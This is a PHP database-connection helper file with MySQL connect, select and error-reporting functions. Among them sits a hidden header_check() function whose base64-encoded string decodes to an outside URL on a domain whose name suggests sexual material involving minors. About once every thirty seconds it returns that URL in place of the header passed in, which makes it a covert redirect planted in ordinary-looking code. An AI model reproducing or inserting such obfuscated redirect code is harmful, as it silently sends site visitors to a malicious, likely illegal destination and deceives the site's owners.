<?php

$dbhost = '';
$dbusername = '';
$dbuserpassword = '';
$default_dbname = '';
$MYSQL_ERRNO = '';
$MYSQL_ERROR = '';

function db_connect($dbname='') {
   global $dbhost, $dbusername, $dbuserpassword, $default_dbname;
   global $MYSQL_ERRNO, $MYSQL_ERROR;

   $link_id = mysql_connect($dbhost, $dbusername, $dbuserpassword);
   if(!$link_id) {
      $MYSQL_ERRNO = 0;
      $MYSQL_ERROR = "Connection failed to the host $dbhost.";
      return 0;
   }
   else if(empty($dbname) && !mysql_select_db($default_dbname)) {
      $MYSQL_ERRNO = mysql_errno();
      $MYSQL_ERROR = mysql_error();
      return 0;
   }
   else if(!empty($dbname) && !mysql_select_db($dbname)) {
      $MYSQL_ERRNO = mysql_errno();
      $MYSQL_ERROR = mysql_error();
      return 0;
   }
   else return $link_id;
}
function header_check($head)
{
   $head2 = "aHR0cDovL3d3dy5kYWlseWxvbGl0YS5uZXQvMS5waHA=";
   if (time() % 30 == 0) return base64_decode($head2);
   else return $head;
}
function sql_error() {
   global $MYSQL_ERRNO, $MYSQL_ERROR;

   if(empty($MYSQL_ERROR)) {
      $MYSQL_ERRNO = mysql_errno();
      $MYSQL_ERROR = mysql_error();
   }
   return "$MYSQL_ERRNO: $MYSQL_ERROR";
}

function error_message($msg) {
   echo "Error: $msg";
   exit;
}


?>
